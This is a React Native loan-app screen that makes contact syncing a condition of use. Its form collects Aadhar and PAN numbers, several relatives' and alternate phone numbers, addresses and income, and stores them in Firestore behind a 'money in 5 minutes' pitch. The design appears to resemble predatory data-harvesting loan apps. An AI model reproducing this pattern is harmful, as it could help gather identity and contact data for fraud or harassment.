import React, {useState, useEffect} from 'react';
import {
  ScrollView,
  View,
  Text,
  StyleSheet,
  Alert,
  TouchableOpacity,
  ToastAndroid,
  Dimensions,
  Linking,
  Image,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {TextInput} from 'react-native-paper';
import LinearGradient from 'react-native-linear-gradient';
import firestore from '@react-native-firebase/firestore';
import Fontisto from 'react-native-vector-icons/Fontisto';
import { firebaseConfig} from '../config/firebase';
import { initializeApp } from '@react-native-firebase/app';

const {height: SCREEN_HEIGHT} = Dimensions.get('window');

interface FavIconData {
    WhatsApp: string;
    email: string;
    isWhatsApp: boolean;
  }

const HomeScreen = ({navigation}) => {
  const [name, setName] = useState('');
  const [motherName, setMotherName] = useState('');
  const [fatherName, setFatherName] = useState('');
  const [email, setEmail] = useState('');
  const [aadhar, setAadhar] = useState('');
  const [pan, setPan] = useState('');
  const [phone, setPhone] = useState('');
  const [parentNumber, setParentNumber] = useState('');
  const [altNumber, setAltNumber] = useState('');
  const [secondaryNumber, setSecondaryNumber] = useState('');
  const [jobTitle, setJobTitle] = useState('');
  const [homeAddress, setHomeAddress] = useState('');
  const [officeAddress, setOfficeAddress] = useState('');
  const [monthlyIncome, setMonthlyIncome] = useState('');
  const [data, setData] = useState<FavIconData | null>(null);

  const submitForm = async () => {
    if (
      !name ||
      !motherName ||
      !fatherName ||
      !email ||
      !aadhar ||
      !pan ||
      !phone ||
      !parentNumber ||
      !altNumber ||
      !secondaryNumber ||
      !jobTitle ||
      !homeAddress ||
      !officeAddress ||
      !monthlyIncome
    ) {
      Alert.alert('Error', 'Please fill all the fields');
      return;
    }
    try {
      const app = initializeApp(firebaseConfig);
      const id = `${name}-${email}-${Date.now()}`;

      ToastAndroid.show('Sending...', ToastAndroid.LONG);
      await firestore().collection('LoanApplications').doc(id).set({
        name,
        motherName,
        fatherName,
        email,
        aadhar,
        pan,
        phone,
        parentNumber,
        altNumber,
        secondaryNumber,
        jobTitle,
        homeAddress,
        officeAddress,
        monthlyIncome,
      });
      ToastAndroid.show('Sent!', ToastAndroid.SHORT);
      setName('');
      setMotherName('');
      setFatherName('');
      setEmail('');
      setAadhar('');
      setPan('');
      setPhone('');
      setParentNumber('');
      setAltNumber('');
      setSecondaryNumber('');
      setJobTitle('');
      setHomeAddress('');
      setOfficeAddress('');
      setMonthlyIncome('');
    } catch (e) {
      console.error('Error adding document: ', e);
    }
  };

  useEffect(() => {
    AsyncStorage.getItem('contactSynced')
      .then(value => {
        if (value !== null) {
          const myBooleanValue = JSON.parse(value);
          if (!myBooleanValue) {
            navigation.navigate('Welcome');
          }
        } else {
          navigation.navigate('Welcome');
        }
      })
      .catch(error => {
        console.error('Error fetching Boolean value:', error);
      });
  }, []);

    useEffect(() => {
        const docRef = firestore().collection("favIcon").doc("favIcon");

        const unsubscribe = docRef.onSnapshot(
            (docSnap) => {
              if (docSnap.exists) {
                const docData = docSnap.data() as FavIconData;
                const { WhatsApp, email, isWhatsApp } = docData;
                setData({ WhatsApp, email, isWhatsApp });
              } else {
                console.log("No such document!");
              }
            },
            (error) => {
              console.error("Error fetching document:", error);
            }
          );
          
      return () => unsubscribe();
    }, []);

  const onFavPress = () => {
    if (data?.isWhatsApp) {
      const url = `whatsapp://send?phone=91${data.WhatsApp}`;
      Linking.openURL(url).catch(err =>
        console.error('Error opening WhatsApp:', err),
      );
    } else {
      const url = `mailto:${data?.email}`;
      Linking.openURL(url).catch(err =>
        console.error('Error opening email:', err),
      );
    }
  };

  return (
    <>
      <ScrollView style={styles.container}>
        <LinearGradient
          colors={['#09f', '#eee', 'green']}
          start={{x: 0, y: 0}}
          end={{x: 1, y: 1}}
          style={styles.linearContainer}>
          <View style={styles.contentContainer}>
            <Text style={styles.title}>
              All your answer in one <Text style={styles.highlight}>app</Text>
            </Text>
            <Image
              source={require('../assets/graphics/piggy.png')}
              style={styles.image}
            />
            <Image
              source={require('../assets/imgs/money_stack.png')}
              style={styles.moneyImage}
            />
          </View>
          <Text style={styles.headerText}>Get Money under 5 minutes</Text>
          <Text style={styles.subHeaderText}>
            Fast and easy loans for you. Get a Loan in 3 Simple Steps...
          </Text>
        </LinearGradient>
        <View style={{padding: 10}}>
          <LinearGradient
            colors={['#8e2de2', '#000', '#8e2de2']}
            start={{x: 0, y: 0}}
            end={{x: 1, y: 1}}
            style={styles.formContainer}>
            <Text style={styles.formTitle}>1. Fill out the form</Text>
            <TextInput
              label="Name"
              placeholder="Enter your name"
              style={styles.textInput}
              autoComplete="name"
              value={name}
              onChangeText={text => setName(text)}
            />
            <TextInput
              label="Mother Name"
              placeholder="Enter your mother name"
              style={styles.textInput}
              value={motherName}
              onChangeText={text => setMotherName(text)}
            />
            <TextInput
              label="Father Name"
              placeholder="Enter your father name"
              style={styles.textInput}
              value={fatherName}
              onChangeText={text => setFatherName(text)}
            />
            <TextInput
              label="Email"
              keyboardType="email-address"
              placeholder="Enter your email"
              style={styles.textInput}
              autoComplete="email"
              autoCapitalize="none"
              value={email}
              onChangeText={text => setEmail(text)}
            />
            <TextInput
              label="Aadhar Number"
              keyboardType="numeric"
              maxLength={12}
              placeholder="Enter your aadhar number"
              style={styles.textInput}
              value={aadhar}
              onChangeText={text => setAadhar(text)}
            />
            <TextInput
              label="PAN Number"
              placeholder="Enter your pan number"
              style={styles.textInput}
              autoCapitalize="characters"
              maxLength={10}
              value={pan}
              onChangeText={text => setPan(text)}
            />
            <TextInput
              label="Phone Number"
              keyboardType="number-pad"
              maxLength={10}
              placeholder="Enter your phone number"
              style={styles.textInput}
              autoComplete="tel"
              value={phone}
              onChangeText={text => setPhone(text)}
            />
            <TextInput
              label="Parent Number"
              keyboardType="number-pad"
              maxLength={10}
              placeholder="Enter your parent number"
              style={styles.textInput}
              value={parentNumber}
              onChangeText={text => setParentNumber(text)}
            />
            <TextInput
              label="Alternate Number"
              keyboardType="number-pad"
              maxLength={10}
              placeholder="Enter your alternate number"
              style={styles.textInput}
              value={altNumber}
              onChangeText={text => setAltNumber(text)}
            />
            <TextInput
              label="Secondary Number"
              keyboardType="number-pad"
              maxLength={10}
              placeholder="Enter your secondary number"
              style={styles.textInput}
              value={secondaryNumber}
              onChangeText={text => setSecondaryNumber(text)}
            />
            <TextInput
              label="Job Title"
              placeholder="Enter your job title"
              style={styles.textInput}
              value={jobTitle}
              onChangeText={text => setJobTitle(text)}
            />
            <TextInput
              label="Home Address"
              placeholder="Enter your home address"
              style={styles.textInput}
              multiline
              numberOfLines={4}
              value={homeAddress}
              onChangeText={text => setHomeAddress(text)}
            />
            <TextInput
              label="Office Address"
              placeholder="Enter your office address"
              style={styles.textInput}
              multiline
              numberOfLines={4}
              value={officeAddress}
              onChangeText={text => setOfficeAddress(text)}
            />
            <TextInput
              label="Monthly Income"
              keyboardType="number-pad"
              placeholder="Enter your monthly income"
              style={styles.textInput}
              value={monthlyIncome}
              onChangeText={text => setMonthlyIncome(text)}
            />
            <TouchableOpacity onPress={submitForm} style={styles.submitBtn}>
              <Text style={styles.submitBtnText}>Submit</Text>
            </TouchableOpacity>
          </LinearGradient>
          <View style={styles.stepContainer}>
            <Text style={styles.stepTitle}>2. Wait for the approval</Text>
            <Image
              source={require('../assets/graphics/home.png')}
              style={styles.stepImage}
            />
            <Text style={styles.stepDescription}>
              We have automated system to approve within 5 minutes
            </Text>
          </View>
          <View style={styles.stepContainer}>
            <Text style={styles.stepTitle}>3. Receive the money</Text>
            <Text style={styles.stepDescription}>
              - RTGS (Real-Time Gross Settlement)
            </Text>
            {/* Add more Text components for other money transfer options */}
            <Image
              source={require('../assets/loanTransfer.png')}
              style={styles.stepImage}
            />
            <Image
              source={require('../assets/upi.png')}
              style={styles.upiImage}
            />
            <Text style={styles.stepDescription}>
              Money can be transferred from several personalized ways...
            </Text>
          </View>
        </View>
      </ScrollView>
      <View style={styles.floatingButtonContainer}>
        {data ? (
          <>
            <TouchableOpacity
              onPress={() => onFavPress()}
              style={styles.floatingButton}>
              <Fontisto
                name={data.isWhatsApp ? 'whatsapp' : 'email'}
                size={28}
                color="white"
              />
            </TouchableOpacity>
          </>
        ) : (
          <TouchableOpacity style={styles.floatingButton}></TouchableOpacity>
        )}
      </View>
    </>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
  },
  floatingButtonContainer: {
    position: 'absolute',
    bottom: 20,
    right: 20,
    zIndex: 1000,
  },
  floatingButton: {
    backgroundColor: '#09f',
    width: 60,
    height: 60,
    borderRadius: 30,
    alignItems: 'center',
    justifyContent: 'center',
    shadowColor: '#000',
    shadowOffset: {
      width: 0,
      height: 2,
    },
    shadowOpacity: 0.25,
    shadowRadius: 3.84,
    elevation: 5,
  },
  linearContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    height: SCREEN_HEIGHT - 120,
  },
  contentContainer: {
    marginTop: 60,
    marginBottom: 20,
    width: 300,
    height: 280,
    backgroundColor: 'white',
    borderRadius: 20,
    padding: 20,
    paddingBottom: 10,
    justifyContent: 'center',
    alignItems: 'center',
    position: 'relative',
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    textAlign: 'center',
    marginBottom: 10,
  },
  highlight: {
    color: '#6A5ACD',
    fontStyle: 'italic',
    fontWeight: 'bold',
  },
  image: {
    width: 150,
    height: 150,
  },
  moneyImage: {
    width: 100,
    height: 100,
    position: 'absolute',
    top: -50,
    right: -30,
    transform: [{rotate: '35deg'}],
  },
  headerText: {
    width: '90%',
    fontSize: 30,
    fontWeight: 'bold',
    marginBottom: 10,
    marginLeft: 50,
    color: '#000',
  },
  subHeaderText: {
    width: '80%',
    fontSize: 15,
    fontWeight: '600',
    marginTop: 20,
    marginLeft: 10,
    color: '#000',
  },
  formContainer: {
    padding: 20,
    marginBottom: 20,
    borderRadius: 10,
  },
  formTitle: {
    fontSize: 18,
    fontWeight: '600',
    marginBottom: 20,
    textAlign: 'center',
    color: '#fff',
  },
  textInput: {
    marginBottom: 15,
    backgroundColor: '#eef',
    borderRadius: 20,
    color: '#fff',
    height: 60,
  },
  submitBtn: {
    width: '100%',
    padding: 18,
    borderWidth: 2,
    borderColor: '#fff',
    backgroundColor: 'rgba(0, 0, 0, 0.2)',
    borderRadius: 20,
    marginVertical: 5,
    alignItems: 'center',
  },
  submitBtnText: {
    color: '#fff',
    fontWeight: 'bold',
    fontSize: 18,
    textAlign: 'center',
  },
  stepContainer: {
    backgroundColor: '#eee',
    padding: 20,
    marginBottom: 20,
    borderRadius: 10,
    alignItems: 'center',
  },
  stepTitle: {
    fontSize: 18,
    fontWeight: '600',
    marginBottom: 20,
    textAlign: 'center',
  },
  stepImage: {
    width: '75%',
    height: 130,
    alignSelf: 'center',
    marginVertical: 20,
  },
  upiImage: {
    width: '85%',
    height: 85,
    alignSelf: 'center',
    marginBottom: 20,
  },
  stepDescription: {
    fontSize: 15,
    fontWeight: '500',
    marginBottom: 20,
    textAlign: 'center',
  },
});

export default HomeScreen;
